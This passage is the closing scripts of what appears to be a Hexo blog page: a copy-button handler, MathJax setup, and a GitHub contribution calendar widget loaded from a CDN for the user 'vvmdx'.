          document.body.appendChild(ta)
          ta.style.position = 'absolute'
          ta.style.top = '0px'
          ta.style.left = '0px'
          ta.value = code
          ta.select()
          ta.focus()
          var result = document.execCommand('copy')
          document.body.removeChild(ta)
          
            if(result)$(this).text('copy success')
            else $(this).text('copy failed')
          
          $(this).blur()
        })).on('mouseleave', function (e) {
          var $b = $(this).find('.copy-btn')
          setTimeout(function () {
            $b.text('copy')
          }, 300)
        }).append(e)
      })
    })
  </script>


<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>

<!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?vvmdx";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="vvmdx";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log('已挂载github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body>
</html>